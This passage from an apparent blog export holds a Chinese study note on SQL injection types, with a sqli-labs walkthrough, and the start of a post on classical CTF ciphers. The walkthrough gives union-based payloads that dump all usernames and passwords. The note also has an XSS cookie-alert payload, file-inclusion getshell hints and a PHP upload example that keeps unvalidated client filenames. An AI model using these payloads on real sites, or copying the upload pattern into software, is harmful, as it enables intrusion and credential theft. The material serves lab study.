值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p>\n<p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name=&#39;admin&#39; and 1=1 &#39;</code> 我们需要将这些烦人的引号给处理掉。</p>\n<h3 id=\"（3）搜索型注入点\"><a href=\"#（3）搜索型注入点\" class=\"headerlink\" title=\"（3）搜索型注入点\"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>&quot;keyword=关键字&quot;</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p>\n<p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like &#39;%测试%&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>\n<blockquote>\n<p>按照数据提交的方式来分类</p>\n</blockquote>\n<h3 id=\"（1）GET-注入\"><a href=\"#（1）GET-注入\" class=\"headerlink\" title=\"（1）GET 注入\"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href=\"http://xxx.com/index.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/index.php?id=1</a> , id 是注入点。</p>\n<h3 id=\"（2）POST-注入\"><a href=\"#（2）POST-注入\" class=\"headerlink\" title=\"（2）POST 注入\"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>\n<h3 id=\"（3）Cookie-注入\"><a href=\"#（3）Cookie-注入\" class=\"headerlink\" title=\"（3）Cookie 注入\"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>\n<h3 id=\"（4）HTTP-头部注入\"><a href=\"#（4）HTTP-头部注入\" class=\"headerlink\" title=\"（4）HTTP 头部注入\"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>\n<blockquote>\n<p>按照执行效果来分类</p>\n</blockquote>\n<h3 id=\"（1）基于布尔的盲注\"><a href=\"#（1）基于布尔的盲注\" class=\"headerlink\" title=\"（1）基于布尔的盲注\"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p>\n<h3 id=\"（2）基于时间的盲注\"><a href=\"#（2）基于时间的盲注\" class=\"headerlink\" title=\"（2）基于时间的盲注\"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>\n<h3 id=\"（3）基于报错注入\"><a href=\"#（3）基于报错注入\" class=\"headerlink\" title=\"（3）基于报错注入\"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<ol>\n<li>单引号</li>\n<li>双引号</li>\n<li>基于数字型注入</li>\n</ol>\n<h3 id=\"（4）联合查询注入\"><a href=\"#（4）联合查询注入\" class=\"headerlink\" title=\"（4）联合查询注入\"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p>\n<h3 id=\"（5）堆查询注入\"><a href=\"#（5）堆查询注入\" class=\"headerlink\" title=\"（5）堆查询注入\"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p>\n<h3 id=\"（6）宽字节注入\"><a href=\"#（6）宽字节注入\" class=\"headerlink\" title=\"（6）宽字节注入\"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p>\n<h3 id=\"基于sqli-labs的实践操作\"><a href=\"#基于sqli-labs的实践操作\" class=\"headerlink\" title=\"基于sqli-labs的实践操作\"></a>基于sqli-labs的实践操作</h3><h4 id=\"1-基于报错的GET-sql注入\"><a href=\"#1-基于报错的GET-sql注入\" class=\"headerlink\" title=\"1.基于报错的GET sql注入\"></a>1.基于报错的GET sql注入</h4><h5 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h5><p><img src=\"/img/less-1.png\" alt></p>\n<p>提示说输入一个数字作为ID的值</p>\n<p>那么先在url输入?id=1</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id=1.png\" alt></p>\n<p>显示查询成功，返回了用户Dumb</p>\n<p>然后尝试使其报错，输入 ?id=1’</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id-1'.png\" alt></p>\n<p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p>\n<p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p>\n<p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p>\n<p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = &#39;$id&#39; limit 0,1 &quot;</code></pre>\n<p> id被单引号包裹，这是字符型注入点</p>\n<h5 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h5><p><img src=\"/img/less-2.png\" alt></p>\n<p>流程与上面差不多</p>\n<p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p>\n<p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p>\n<p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id =$ id limit 0,1 &quot;</code></pre>\n<p>id没有被单引号包裹，这是一个数字型注入点</p>\n<h5 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h5><p><img src=\"/img/less-3.png\" alt></p>\n<p>这次的报错是 ‘’1’’) LIMIT 0,1’</p>\n<p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p>\n<p>显然，后台语句是</p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = (&#39;$id&#39;) limit 0,1 &quot;</code></pre>\n<p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p>\n<p>比如上面这个less-3</p>\n<p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p>\n<p><img src=\"/img/--+.png\" alt></p>\n<p><img src=\"/img/--%20.png\" alt></p>\n<p>都成功了，这就说明后台语句和我们想的八九不离十了</p>\n<h5 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p>\n<p>那就使用\\来制造报错，输入 id=1\\</p>\n<p>返回报错 ‘“1\\“) LIMIT 0,1’–&gt;”1\\“) LIMIT 0,1</p>\n<p>\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p>\n<p>合理推测：</p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = (&quot;id&quot;) limit 0,1 &quot;</code></pre>\n<p>验证：</p>\n<p><img src=\"/img/less-4.png\" alt></p>\n<p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p>\n<p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p>\n<p>例如less-1(字符型) 就可以输入?id=1’ order by 1(,2,3,4… ) –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p>\n<p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p>\n<p>我们要构造的语句是SELECT username,password FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p>\n<p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p>\n<p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p>\n<p>效果</p>\n<p><img src=\"/img/union%E6%B3%A8%E5%85%A5.png\" alt></p>\n<p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p>\n<p>于是接下来注入 id=0’ union select 1,user(),database() –+</p>\n<p><img src=\"/img/union%E7%88%86%E5%BA%93.png\" alt></p>\n<p>爆出了用户名和使用的数据库名</p>\n<p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p>\n<p>例如：</p>\n<p>爆表：</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+</code></pre>\n<p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p>\n<p><img src=\"/img/union%E7%88%86%E8%A1%A8.png\" alt></p>\n<p>看到了最后一个表是’users’,可用于下一步爆字段</p>\n<p>爆字段：</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(column_name),database() from information_schema.columns where table_name=&#39;users&#39; --+</code></pre>\n<p><img src=\"/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png\" alt></p>\n<p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(username,0x3a,password),3 from users --+</code></pre>\n<p><img src=\"img%5Cunion%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png\" alt></p>\n<p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p>\n<h2 id=\"任意文件包含\"><a href=\"#任意文件包含\" class=\"headerlink\" title=\"任意文件包含\"></a>任意文件包含</h2><p>网站服务器配置中的allow_url_fopen以及allow_url_include对文件包含的实现影响很大</p>\n<p>最常用的方式是在页面可以包含文件的情况下，用file://(本地文件包含) ,php://filter(input, memory,temp) ,data:// ,zip://系列 ,http://(远程文件包含)还有phar:// 等伪协议进行文件包含，进行传马，getshell等操作</p>\n<h2 id=\"XSS跨站请求\"><a href=\"#XSS跨站请求\" class=\"headerlink\" title=\"XSS跨站请求\"></a>XSS跨站请求</h2><h3 id=\"反射型-reflect\"><a href=\"#反射型-reflect\" class=\"headerlink\" title=\"反射型(reflect)\"></a>反射型(reflect)</h3><p>还没彻底整明白，以后再水</p>\n<h3 id=\"储存型-store\"><a href=\"#储存型-store\" class=\"headerlink\" title=\"储存型(store)\"></a>储存型(store)</h3><p>还没彻底整明白，以后再水</p>\n<h3 id=\"DOM型\"><a href=\"#DOM型\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h3><p>上次招新赛就是DOM型，传入的username参数会被嵌入到返回页面的DOM中，直接嵌入</p>\n<pre><code class=\"HTML\">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>\n<p>直接弹出cookie</p>\n<h2 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h2><p>重要基础知识</p>\n<pre><code>当客户端提交后，收到上传文件的页面获得了一个$_FILES 数组 \n\n$_FILES数组内容如下: \n$_FILES[&#39;myFile&#39;][&#39;name&#39;] 客户端文件的原名称。 \n$_FILES[&#39;myFile&#39;][&#39;type&#39;] 文件的 MIME 类型，需要浏览器提供该信息的支持。 \n$_FILES[&#39;myFile&#39;][&#39;size&#39;] 已上传文件的大小，单位为字节。 \n$_FILES[&#39;myFile&#39;][&#39;tmp_name&#39;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 \n$_FILES[&#39;myFile&#39;][&#39;error&#39;] 和该文件上传相关的错误代码。[&#39;error&#39;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) \n\nUPLOAD_ERR_OK \n值：0; 没有错误发生，文件上传成功。 \nUPLOAD_ERR_INI_SIZE \n值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 \nUPLOAD_ERR_FORM_SIZE \n值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 \nUPLOAD_ERR_PARTIAL \n值：3; 文件只有部分被上传。 \nUPLOAD_ERR_NO_FILE \n值：4; 没有文件被上传。 \n值：5; 上传文件大小为0. \n\n文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</code></pre><h3 id=\"PHP-FILES中error返回值详解\"><a href=\"#PHP-FILES中error返回值详解\" class=\"headerlink\" title=\"PHP $_FILES中error返回值详解\"></a>PHP $_FILES中error返回值详解</h3><p>用PHP上传文件时，我们会用程序去监听浏览器发送过来的文件信息，首先会通 过$_FILES[fieldName][‘error’]的不同数值来判断此欲上传的文件状态是否正常。$_FILES[fieldName] [‘error’]==0代表一切正常，其它数值的具体含义请参考下面一段程序的注释部分</p>\n<p>$_FILES[‘file’][‘error’]值 </p>\n<p>UPLOAD_ERR_OK: 0 //正常，上传成功 </p>\n<p>UPLOAD_ERR_INI_SIZE: 1 //上传文件大小超过服务器允许上传的最大值，php.ini中设置upload_max_filesize选项限制的值 </p>\n<p>UPLOAD_ERR_FORM_SIZE: 2 //上传文件大小超过HTML表单中隐藏域MAX_FILE_SIZE选项指定的值 </p>\n<p>UPLOAD_ERR_PARTIAL: 3 //文件只有部分被上传 </p>\n<p>UPLOAD_ERR_NO_FILE: 4 //没有文件被上传</p>\n<p>UPLOAD_ERR_NO_SIZE: 5//上传文件大小为0</p>\n<p>UPLOAD_ERR_NO_TMP_DIR: 6 //没有找不到临时文件夹 </p>\n<p>UPLOAD_ERR_CANT_WRITE: 7 //文件写入失败 </p>\n<p>UPLOAD_ERR_EXTENSION: 8 //php文件上传扩展没有打开 </p>\n<h3 id=\"PHP文件上传-move-uploaded-file-参数的正确写法\"><a href=\"#PHP文件上传-move-uploaded-file-参数的正确写法\" class=\"headerlink\" title=\"PHP文件上传 move_uploaded_file() 参数的正确写法\"></a>PHP文件上传 move_uploaded_file() 参数的正确写法</h3><p>该函数的作用是把上传的文件移动到一个新的位置。因为前端文件上传之后是存在一个临时文件中，在脚本结束后，临时文件就会销毁，所以如果想要保存上传的文件，就需要使用move_uploaded_file()函数将文件转移到指定存放位置。<br>有两个参数，第一个参数是你上传后的临时文件名，由系统自动生成。通常其名称在</p>\n<pre><code>$_FILE[&quot;file&quot;][&quot;tmp_name&quot;];</code></pre><p>其中的file为你前台文件上传表单的名称(“name”)。<br><strong>第二个参数就是包含有路径的新的文件名</strong>。如：<br>“upload/1.jpg”;<br>这样，就会把你上传的文件，移动到当前目录下名称upload的子目录下，并把文件名保存为：1.jpg</p>\n<h3 id=\"php-move-uploaded-file-介绍\"><a href=\"#php-move-uploaded-file-介绍\" class=\"headerlink\" title=\"php move_uploaded_file()介绍\"></a>php move_uploaded_file()介绍</h3><p>move_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。</p>\n<p><strong>语法</strong></p>\n<pre><code class=\"php\">move_uploaded_file(filename,destination)\nmove_uploaded_file($_FILE[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot;.$_FILE[&quot;file&quot;][&quot;name&quot;]) \n    //将临时文件拷贝到upload目录下的同名文件中</code></pre>\n<p><strong>参数</strong> </p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>filename</td>\n<td>上传的文件的文件名。</td>\n</tr>\n<tr>\n<td>destination</td>\n<td>移动文件到这个位置。</td>\n</tr>\n</tbody></table>\n<p><strong>本函数检查并确保由 filename 指定的文件是合法的上传文件。如果文件合法，则将其移动到 destination指定的位置。</strong></p>\n<p>如果 filename 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。</p>\n<p>如果 filename 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。</p>\n<p><strong>注意</strong></p>\n<ol>\n<li>本函数仅用于通过 HTTP POST 上传的文件。</li>\n<li>如果目标文件已经存在，将会被覆盖。</li>\n</ol>\n<h3 id=\"move-uploaded-file-函数实例\"><a href=\"#move-uploaded-file-函数实例\" class=\"headerlink\" title=\"move_uploaded_file()函数实例\"></a>move_uploaded_file()函数实例</h3><p>使用move_uploaded_file()函数上传文件到服务器。</p>\n<pre><code class=\"php\">&lt;?php\n     $tmp_filename = $_FILES[&#39;myupload&#39;][&#39;tmp_name&#39;];\n     if(!move_uploaded_file($tmp_filename,&quot;/path/to/dest/{$_FILES[&#39;myupload&#39;][&#39;name&#39;]}&quot;)) {\n          echo &quot;An error has occurred moving the uploaded file.&lt;BR&gt;&quot;;\n          echo &quot;Please ensure that if safe_mode is on that the &quot; . &quot;UID PHP is using matches the file.&quot;;\n          exit;\n     } else {\n          echo &quot;The file has been successfully uploaded!&quot;;\n     }\n?&gt;</code></pre>\n"},{"title":"ctf常见加密","date":"2020-09-30T16:00:00.000Z","description":"自己总结的。","_content":"\n[toc]\n\n\n\n# CTF中常见的加密\n\n\n\n##  **1.凯撒密码**\n\n通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。只需简单地统计字频就可以破译\n\n**经典的凯撒加密算法是移动3位**\n\n\n\n## 2.**base64**\n\n是网络上最常见的用于传输8Bit[字节代码](http://baike.baidu.com/item/字节代码)的编码方式之一\n\n**特征：Base64就是用下列总计64个字符：**\n\n**A-Z a-z 0-9 + /**\n\nBase64字符串的长度必然**是4的整数倍**\n\nBase64很多都是以=或==结尾的。但是注意，也存在不以=或==结尾的Base64，只要编码的二进制字节数恰好被3给整除。\n\n\n\n## 3.**rot13**\n\nROT13（回转13位，rotateby13places，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。它是一种在网路论坛用作隐藏八卦、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。\n\n \n\n**特征：再rot13加密一次得到明文**\n\n \n\n套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可[2]。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。\n\n \n\n## 4.**md5**\n\nMD5以512位分组来处理输入文本，每一分组又划分为16个32位子分组。算法的输出由四个32位分组组成，将它们级联形成一个128位散列值。\n\n \n\n## 5.**sha1**\n\n对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要\n\n## 6.**crc32**\n\n在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。\n\n**特征：CRC32的计算结果只有8位**\n\n \n\n## **7.Uuencode**\n\nuuencode是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件。\n\n\n\n**特征：每行都是以M开头**\n\n 编码算法为不断地用3个字节数据列成一组(不足3个字节以零补齐)然后 此24位数据分为4 组,每组6位,再将得到的6位二进制数映射到ASCII码32~95之间的字符,而每行以M 开头(表示32+45),60个字符一行(包括”M”),最后一行以32+N 的ASCII字符开头,N 为最后一行编码的输入字节数.编码以一个只含一个空格的一行和只含”end”的一行结束.\n\n## 8.**栅栏密码**\n\n就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。\n\n一般比较常见的是2栏的栅栏密码。\n\n比如[明文](http://baike.baidu.com/item/明文)：THERE IS A CIPHER\n\n去掉空格后变为：THEREISACIPHER\n\n两个一组，得到：TH ER EI SA CI PH ER\n\n先取出第一个字母：TEESCPE\n\n再取出第二个字母：HRIAIHR\n\n连在一起就是：TEESCPEHRIAIHR\n\n还原为所需密码。\n\n而解密的时候，我们先把密文从中间分开，变为两行：\n\nT E E S C P E\n\nH R I A I H R\n\n再按上下上下的顺序组合起来：\n\nTHEREISACIPHER\n\n分出空格，就可以得到原文了：\n\nTHERE IS A CIPHER\n\n \n\n明文：THERE IS A CIPHER\n\n七个一组：THEREIS ACIPHER\n\n抽取字母：TA HC EI RP EH IE SR\n\n组合得到密码：TAHCEIRPEHIESR\n\n那么这时候就无法再按照2栏的方法来解了…\n\n*1**分析解码*这样，我们可以通过分析密码的字母数来解出密码…\n\n比如：TAHCEIRPEHIESR\n\n一共有14个字母，可能是2栏或者7栏…\n\n尝试2栏…失败\n\n尝试7栏…成功\n\n \n\n## **9.培根密码**：\n\n**特征：010101010101**\n\n培根所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b。\n\n第一种方式\n\nA aaaaa B aaaab C aaaba D aaabb E aabaa\n\nF aabab G aabba H aabbb I abaaa J abaab\n\nK ababa L ababb M abbaa N abbab O abbba\n\nP abbbb Q baaaa R baaab S baaba T baabb\n\nU babaa V babab W babba X babbb Y bbaaa\n\nZ bbaab\n\n \n\n第二种方式\n\na AAAAA g AABBA n ABBAA t BAABA\n\nb AAAAB h AABBB o ABBAB u-v BAABB\n\nc AAABA i-j ABAAA p ABBBA w BABAA\n\nd AAABB k ABAAB q ABBBB x BABAB\n\ne AABAA l ABABA r BAAAA y BABBA\n\nf AABAB m ABABB s BAAAB z BABBB\n\n \n\n## 10.**维吉尼亚密码**：\n\n人们在单一[恺撒密码](http://baike.baidu.com/item/恺撒密码)的基础上扩展出多表密码，维吉尼亚密码引入了“[密钥](http://baike.baidu.com/item/密钥)”的概念，即根据密钥来决定用哪一行的密表来进行替换，以此来对抗字频统计。\n\n密码表：\n\nA B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n\nA -A B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n\nB -B C D E F G H I J K L M N O P Q R S T U V W X Y Z A\n\nC -C D E F G H I J K L M N O P Q R S T U V W X Y Z A B\n\nD -D E F G H I J K L M N O P Q R S T U V W X Y Z A B C\n\nE -E F G H I J K L M N O P Q R S T U V W X Y Z A B C D\n\nF -F G H I J K L M N O P Q R S T U V W X Y Z A B C D E\n\nG -G H I J K L M N O P Q R S T U V W X Y Z A B C D E F\n\nH -H I J K L M N O P Q R S T U V W X Y Z A B C D E F G\n\nI -I J K L M N O P Q R S T U V W X Y Z A B C D E F G H\n\nJ -J K L M N O P Q R S T U V W X Y Z A B C D E F G H I\n\nK -K L M N O P Q R S T U V W X Y Z A B C D E F G H I J\n\nL -L M N O P Q R S T U V W X Y Z A B C D E F G H I J K\n\nM -M N O P Q R S T U V W X Y Z A B C D E F G H I J K L\n\nN -N O P Q R S T U V W X Y Z A B C D E F G H I J K L M\n\nO -O P Q R S T U V W X Y Z A B C D E F G H I J K L M N\n\nP -P Q R S T U V W X Y Z A B C D E F G H I J K L M N O\n\nQ -Q R S T U V W X Y Z A B C D E F G H I J K L M N O P\n\nR -R S T U V W X Y Z A B C D E F G H I J K L M N O P Q\n\nS -S T U V W X Y Z A B C D E F G H I J K L M N O P Q R\n\nT -T U V W X Y Z A B C D E F G H I J K L M N O P Q R S\n\nU -U V W X Y Z A B C D E F G H I J K L M N O P Q R S T\n\nV -V W X Y Z A B C D E F G H I J K L M N O P Q R S T U\n\nW -W X Y Z A B C D E F G H I J K L M N O P Q R S T U V\n\nX -X Y Z A B C D E F G H I J K L M N O P Q R S T U V W\n\nY -Y Z A B C D E F G H I J K L M N O P Q R S T U V W X\n\nZ -Z A B C D E F G H I J K L M N O P Q R S T U V W X Y\n\n当选定RELATIONS作为密钥时，加密过程是：明文一个字母为T，第一个密钥字母为R，因此可以找到在R行中代替T的为K，依此类推，得出对应关系如下：\n\n密钥:RELAT IONSR ELATI ONSRE LATIO NSREL\n\n明文:TOBEO RNOTT OBETH ATIST HEQUE STION\n\n密文:KSMEH ZBBLK SMEMP OGAJX SEJCS FLZSY\n\n \n\n## 11.**猪圈密码**\n\n遇到了就自行百度密码表\n\n \n\n## 12.**rabbit**加密：\n\n特征：有U2Fsd开头\n\n \n\n## 13.**utf-7**\n\nUTF-7 (7-位元 Unicode 转换格式（Unicode Transformation Format，简写成 UTF）) 是一种可变长度字元编码方式，用以将 Unicode 字元以 ASCII 编码的字元串来呈现，可以应用在[电子邮件](http://baike.baidu.com/item/电子邮件)传输之类的应用。\n\n \n\n## 14.**波利比奥斯方阵密码**\n\n棋盘密码是利用波利比奥斯方阵(Polybius Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。\n\n简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。\n\n### 排列法1：\n\n[![img](http://www.lsablog.com/wp-content/uploads/2017/04/Picture1.png)\n\n### 排列法2：\n\n![img](http://www.lsablog.com/wp-content/uploads/2017/04/Picture2.png).\n\n \n\n## 15.摩斯密码：\n\n它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。\n\n密码表：\n\nA . _ M _ _ Y _ . _ _\n B _ . . . N _ . Z _ _ . .\n C _ . _ . O _ _ _ 1 . _ _ _ _\n D _ . . P . _ _ . 2 . . _ _ _\n E . Q _ _ . _ 3 . . . _ _\n F . . _ . R . _ . 4 . . . . _\n G _ _ . S . . . 5 . . . . .\n H . . . . T _ 6 _ . . . .\n I . . U . . _ 7 _ _ . . .\n J . _ _ _ V . . . _ 8 _ _ _ . .\n K _ . _ W . _ _ 9 _ _ _ _ .\n L . _ . . X _ . . _ 0 _ _ _ _ _\n\n \n\n1 =- – – – ？ ==- -==\n 2 ==- – – / -==-=\n 3 ===- – （ ) -=- -=-\n 4 ====- – -====-\n 5 ===== 。 =-=-=-\n 6 -====\n 7 – -===\n 8 – – -==\n 9 – – – -=\n 0 – – – – –\n\n \n\n## 16.**当铺密码：**\n\n就是一种将中文和[数字](http://baike.baidu.com/item/数字/6204)进行转化的[密码](http://baike.baidu.com/item/密码/65553)，[算法](http://baike.baidu.com/item/算法)相当简单:当前汉字有多少笔画出头，就是转化成数字几。\n\n王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125","source":"_posts/2020-10-01-ctf常见加密.md","raw":"---\ntitle: ctf常见加密\ndate: 2020-10-01\ncategories: blog\ntags: [CTF,密码学]\ndescription: 自己总结的。\n---\n\n[toc]\n\n\n\n# CTF中常见的加密\n\n\n\n##  **1.凯撒密码**\n\n通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。只需简单地统计字频就可以破译\n\n**经典的凯撒加密算法是移动3位**\n\n\n\n## 2.**base64**\n\n是网络上最常见的用于传输8Bit[字节代码](http://baike.baidu.com/item/字节代码)的编码方式之一\n\n**特征：Base64就是用下列总计64个字符：**\n\n**A-Z a-z 0-9 + /**\n\nBase64字符串的长度必然**是4的整数倍**\n\nBase64很多都是以=或==结尾的。但是注意，也存在不以=或==结尾的Base64，只要编码的二进制字节数恰好被3给整除。\n\n\n\n## 3.**rot13**\n\nROT13（回转13位，rotateby13places，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。它是一种在网路论坛用作隐藏八卦、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。\n\n \n\n**特征：再rot13加密一次得到明文**\n\n \n\n套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可[2]。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。\n\n \n\n## 4.**md5**\n\nMD5以512位分组来处理输入文本，每一分组又划分为16个32位子分组。算法的输出由四个32位分组组成，将它们级联形成一个128位散列值。\n\n \n\n## 5.**sha1**\n\n对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要\n\n## 6.**crc32**\n\n在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。\n\n**特征：CRC32的计算结果只有8位**\n\n \n\n## **7.Uuencode**\n\nuuencode是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件。\n\n\n\n**特征：每行都是以M开头**\n\n 编码算法为不断地用3个字节数据列成一组(不足3个字节以零补齐)然后 此24位数据分为4 组,每组6位,再将得到的6位二进制数映射到ASCII码32~95之间的字符,而每行以M 开头(表示32+45),60个字符一行(包括”M”),最后一行以32+N 的ASCII字符开头,N 为最后一行编码的输入字节数.编码以一个只含一个空格的一行和只含”end”的一行结束.\n\n## 8.**栅栏密码**\n\n就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。\n\n一般比较常见的是2栏的栅栏密码。\n\n比如[明文](http://baike.baidu.com/item/明文)：THERE IS A CIPHER\n\n去掉空格后变为：THEREISACIPHER\n\n两个一组，得到：TH ER EI SA CI PH 